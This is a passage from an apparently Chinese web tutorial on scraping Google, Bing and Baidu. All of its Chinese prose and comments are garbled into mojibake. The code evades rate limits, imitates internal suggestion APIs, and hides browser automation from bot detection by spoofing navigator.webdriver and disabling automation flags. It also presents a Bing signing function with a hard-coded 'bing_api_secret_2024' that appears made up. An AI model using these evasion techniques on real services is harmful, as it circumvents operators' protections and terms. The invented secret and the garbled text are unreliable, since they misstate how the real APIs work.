        <span class="n">delay</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">min_delay</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">max_delay</span><span class="p">,</span> <span class="n">delay</span><span class="p">))</span>

        <span class="k">if</span> <span class="n">elapsed</span> <span class="o">&lt;</span> <span class="n">delay</span><span class="p">:</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">delay</span> <span class="o">-</span> <span class="n">elapsed</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">last_request_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¸¦æ™ºèƒ½å»¶è¿Ÿçš„æœç´¢&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="s1">&#39;https://www.google.com/search&#39;</span><span class="p">,</span>
            <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">}</span>
        <span class="p">)</span>

        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">evader</span> <span class="o">=</span> <span class="n">RateLimitEvader</span><span class="p">(</span><span class="n">min_delay</span><span class="o">=</span><span class="mf">3.0</span><span class="p">,</span> <span class="n">max_delay</span><span class="o">=</span><span class="mf">7.0</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">evader</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;query </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Search </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> completed&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-2-æœç´¢ç»“æœ-api-é€†å‘">æ¡ˆä¾‹ 2: æœç´¢ç»“æœ API é€†å‘</h2>

      <h3 id="èƒŒæ™¯-2">èƒŒæ™¯</h3>

      <p>æœç´¢å¼•æ“é€šå¸¸æœ‰å†…éƒ¨ APIï¼ˆç”¨äºè‡ªåŠ¨è¡¥å…¨ã€ç›¸å…³æœç´¢ç­‰ï¼‰ï¼Œè¿™äº› API çš„é˜²æŠ¤ç›¸å¯¹è¾ƒå¼±ã€‚</p>

      <h3 id="é€†å‘æ­¥éª¤-2">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-å‘ç°éšè—-api">1. å‘ç°éšè— API</h4>

      <p>ä½¿ç”¨ Chrome DevTools ç›‘æ§ç½‘ç»œè¯·æ±‚:</p>

      <p><strong>Google è‡ªåŠ¨è¡¥å…¨ API</strong>:</p>

      <pre><code>GET /complete/search?q=python&amp;client=chrome HTTP/1.1
Host: www.google.com
</code></pre>

      <p><strong>å“åº”</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">[</span>
<span class="w">  </span><span class="s2">&quot;python&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span>
<span class="w">    </span><span class="s2">&quot;python tutorial&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;python download&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;python for beginners&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="s2">&quot;python snake&quot;</span>
<span class="w">  </span><span class="p">]</span>
<span class="p">]</span>
</code></pre>
      </div>

      <p><strong>Bing æœç´¢å»ºè®® API</strong>:</p>

      <pre><code>GET /AS/Suggestions?pt=page.home&amp;mkt=en-US&amp;qry=javascript&amp;cp=10&amp;cvid=xxx
Host: www.bing.com
</code></pre>

      <h4 id="2-é€†å‘ç­¾åç®—æ³•">2. é€†å‘ç­¾åç®—æ³•</h4>

      <p>æŸäº› API éœ€è¦ç­¾åå‚æ•°:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Bing æœç´¢é¡µé¢çš„ JS ä¸­æ‰¾åˆ°</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">generateSearchSignature</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;bing_api_secret_2024&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">query</span><span class="si">}</span><span class="sb">|</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">|</span><span class="si">${</span><span class="nx">secret</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">SHA256</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">searchAPI</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">sig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generateSearchSignature</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="sb">`/api/search?q=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">query</span><span class="p">)</span><span class="si">}</span><span class="sb">&amp;t=</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">&amp;sig=</span><span class="si">${</span><span class="nx">sig</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
<span class="w">        </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="python-å®ç°">Python å®ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">class</span><span class="w"> </span><span class="nc">SearchEngineAPI</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.google.com/&#39;</span>
        <span class="p">})</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">google_autocomplete</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Google è‡ªåŠ¨è¡¥å…¨ API&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.google.com/complete/search&#39;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
            <span class="s1">&#39;client&#39;</span><span class="p">:</span> <span class="s1">&#39;chrome&#39;</span><span class="p">,</span>  <span class="c1"># æˆ– &#39;firefox&#39;, &#39;safari&#39;</span>
            <span class="s1">&#39;hl&#39;</span><span class="p">:</span> <span class="s1">&#39;en&#39;</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>

        <span class="c1"># å“åº”æ ¼å¼: [query, [suggestions], ...]</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="p">[]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">bing_suggestions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Bing æœç´¢å»ºè®® API&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.bing.com/AS/Suggestions&#39;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;pt&#39;</span><span class="p">:</span> <span class="s1">&#39;page.home&#39;</span><span class="p">,</span>
            <span class="s1">&#39;mkt&#39;</span><span class="p">:</span> <span class="s1">&#39;en-US&#39;</span><span class="p">,</span>
            <span class="s1">&#39;qry&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
            <span class="s1">&#39;cp&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">query</span><span class="p">),</span>
            <span class="s1">&#39;cvid&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">_generate_cvid</span><span class="p">()</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

        <span class="c1"># æå–å»ºè®®</span>
        <span class="n">suggestions</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">group</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;AS&#39;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Results&#39;</span><span class="p">,</span> <span class="p">[]):</span>
            <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">group</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Suggests&#39;</span><span class="p">,</span> <span class="p">[]):</span>
                <span class="n">suggestions</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Txt&#39;</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">suggestions</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_generate_cvid</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆ Bing çš„ CVID (Correlation Vector ID)&quot;&quot;&quot;</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">uuid</span>
        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">baidu_suggestion</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç™¾åº¦æœç´¢å»ºè®® API&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.baidu.com/sugrec&#39;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;prod&#39;</span><span class="p">:</span> <span class="s1">&#39;pc&#39;</span><span class="p">,</span>
            <span class="s1">&#39;wd&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
            <span class="s1">&#39;cb&#39;</span><span class="p">:</span> <span class="s1">&#39;jQuery&#39;</span>  <span class="c1"># JSONP callback</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>

        <span class="c1"># è§£æ JSONP å“åº”</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
        <span class="n">json_str</span> <span class="o">=</span> <span class="n">text</span><span class="p">[</span><span class="n">text</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span><span class="n">text</span><span class="o">.</span><span class="n">rindex</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">)]</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">json_str</span><span class="p">)</span>

        <span class="n">suggestions</span> <span class="o">=</span> <span class="p">[</span><span class="n">item</span><span class="p">[</span><span class="s1">&#39;q&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="p">[])]</span>
        <span class="k">return</span> <span class="n">suggestions</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">signed_search</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">secret_key</span><span class="o">=</span><span class="s2">&quot;bing_api_secret_2024&quot;</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¸¦ç­¾åçš„æœç´¢ API&quot;&quot;&quot;</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="n">sig</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_generate_signature</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">)</span>

        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://api.search.example.com/search&#39;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
            <span class="s1">&#39;t&#39;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
            <span class="s1">&#39;sig&#39;</span><span class="p">:</span> <span class="n">sig</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">_generate_signature</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">secret</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆæœç´¢ç­¾å&quot;&quot;&quot;</span>
        <span class="n">str_to_sign</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">str_to_sign</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">api</span> <span class="o">=</span> <span class="n">SearchEngineAPI</span><span class="p">()</span>

<span class="c1"># Google è‡ªåŠ¨è¡¥å…¨</span>
<span class="n">suggestions</span> <span class="o">=</span> <span class="n">api</span><span class="o">.</span><span class="n">google_autocomplete</span><span class="p">(</span><span class="s1">&#39;python&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Google suggestions:&quot;</span><span class="p">,</span> <span class="n">suggestions</span><span class="p">)</span>

<span class="c1"># Bing å»ºè®®</span>
<span class="n">bing_suggestions</span> <span class="o">=</span> <span class="n">api</span><span class="o">.</span><span class="n">bing_suggestions</span><span class="p">(</span><span class="s1">&#39;javascript&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Bing suggestions:&quot;</span><span class="p">,</span> <span class="n">bing_suggestions</span><span class="p">)</span>

<span class="c1"># ç™¾åº¦å»ºè®®</span>
<span class="n">baidu_suggestions</span> <span class="o">=</span> <span class="n">api</span><span class="o">.</span><span class="n">baidu_suggestion</span><span class="p">(</span><span class="s1">&#39;æœºå™¨å­¦ä¹ &#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Baidu suggestions:&quot;</span><span class="p">,</span> <span class="n">baidu_suggestions</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-3-javascript-æ¸²æŸ“ç»“æœæå–">æ¡ˆä¾‹ 3: JavaScript æ¸²æŸ“ç»“æœæå–</h2>

      <h3 id="èƒŒæ™¯-3">èƒŒæ™¯</h3>

      <p>ç°ä»£æœç´¢å¼•æ“å¤§é‡ä½¿ç”¨ JavaScript æ¸²æŸ“ç»“æœï¼ˆSPAï¼‰ï¼Œé™æ€çˆ¬è™«æ— æ³•è·å–å®Œæ•´å†…å®¹ã€‚</p>

      <h3 id="æŒ‘æˆ˜">æŒ‘æˆ˜</h3>

      <ul>
        <li><strong>åŠ¨æ€åŠ è½½</strong>: æ»šåŠ¨åŠ è½½æ›´å¤šç»“æœ</li>
        <li><strong>å»¶è¿Ÿæ¸²æŸ“</strong>: ç»“æœåˆ†æ‰¹æ¸²æŸ“</li>
        <li><strong>åè°ƒè¯•</strong>: æ£€æµ‹ DevToolsã€Selenium</li>
      </ul>

      <h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-ä½¿ç”¨-playwrightæ¨è">1. ä½¿ç”¨ Playwrightï¼ˆæ¨èï¼‰</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">JavaScriptSearchScraper</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">context</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆå§‹åŒ–æµè§ˆå™¨&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span> <span class="o">=</span> <span class="n">sync_playwright</span><span class="p">()</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

        <span class="c1"># ä½¿ç”¨éšèº«æ¨¡å¼ï¼Œé¿å…æ£€æµ‹</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">(</span>
            <span class="n">headless</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
            <span class="n">args</span><span class="o">=</span><span class="p">[</span>
                <span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">,</span>
                <span class="s1">&#39;--disable-dev-shm-usage&#39;</span><span class="p">,</span>
                <span class="s1">&#39;--no-sandbox&#39;</span>
            <span class="p">]</span>
        <span class="p">)</span>

        <span class="c1"># ä¿®æ”¹ navigator.webdriver</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">context</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="o">.</span><span class="n">new_context</span><span class="p">(</span>
            <span class="n">viewport</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1920</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">},</span>
            <span class="n">user_agent</span><span class="o">=</span><span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span>
        <span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">add_init_script</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">            Object.defineProperty(navigator, &#39;webdriver&#39;, {</span>
<span class="s2">                get: () =&gt; undefined</span>
<span class="s2">            });</span>
<span class="s2">        &quot;&quot;&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">search_google</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">num_results</span><span class="o">=</span><span class="mi">100</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æœç´¢ Google å¹¶æå–ç»“æœ&quot;&quot;&quot;</span>
        <span class="n">page</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>

        <span class="c1"># è®¿é—®æœç´¢é¡µé¢</span>
        <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://www.google.com/search?q=</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

        <span class="c1"># ç­‰å¾…ç»“æœåŠ è½½</span>
        <span class="n">page</span><span class="o">.</span><span class="n">wait_for_selector</span><span class="p">(</span><span class="s1">&#39;#search&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10000</span><span class="p">)</span>

        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">loaded_results</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="c1"># æ»šåŠ¨åŠ è½½æ›´å¤šç»“æœ</span>
        <span class="k">while</span> <span class="n">loaded_results</span> <span class="o">&lt;</span> <span class="n">num_results</span><span class="p">:</span>
            <span class="c1"># æå–å½“å‰å¯è§ç»“æœ</span>
            <span class="n">items</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">query_selector_all</span><span class="p">(</span><span class="s1">&#39;.g&#39;</span><span class="p">)</span>

            <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">[</span><span class="n">loaded_results</span><span class="p">:]:</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">title_elem</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;h3&#39;</span><span class="p">)</span>
                    <span class="n">link_elem</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
                    <span class="n">snippet_elem</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;.VwiC3b&#39;</span><span class="p">)</span>

                    <span class="k">if</span> <span class="n">title_elem</span> <span class="ow">and</span> <span class="n">link_elem</span><span class="p">:</span>
                        <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                            <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">title_elem</span><span class="o">.</span><span class="n">inner_text</span><span class="p">(),</span>
                            <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">link_elem</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">),</span>
                            <span class="s1">&#39;snippet&#39;</span><span class="p">:</span> <span class="n">snippet_elem</span><span class="o">.</span><span class="n">inner_text</span><span class="p">()</span> <span class="k">if</span> <span class="n">snippet_elem</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span>
                        <span class="p">})</span>

                <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                    <span class="k">continue</span>

            <span class="n">loaded_results</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>

            <span class="c1"># æ»šåŠ¨åˆ°åº•éƒ¨</span>
            <span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="s1">&#39;window.scrollTo(0, document.body.scrollHeight)&#39;</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

            <span class="c1"># æ£€æŸ¥æ˜¯å¦æœ‰&quot;æ›´å¤šç»“æœ&quot;æŒ‰é’®</span>
            <span class="n">more_button</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;a#pnnext&#39;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">more_button</span> <span class="ow">and</span> <span class="n">loaded_results</span> <span class="o">&lt;</span> <span class="n">num_results</span><span class="p">:</span>
                <span class="n">more_button</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
                <span class="n">page</span><span class="o">.</span><span class="n">wait_for_load_state</span><span class="p">(</span><span class="s1">&#39;networkidle&#39;</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">break</span>

        <span class="n">page</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">results</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">search_bing</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æœç´¢ Bingï¼ˆå¤„ç†æ— é™æ»šåŠ¨ï¼‰&quot;&quot;&quot;</span>
        <span class="n">page</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>
        <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://www.bing.com/search?q=</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

        <span class="c1"># ç­‰å¾…ç»“æœ</span>
        <span class="n">page</span><span class="o">.</span><span class="n">wait_for_selector</span><span class="p">(</span><span class="s1">&#39;.b_algo&#39;</span><span class="p">)</span>

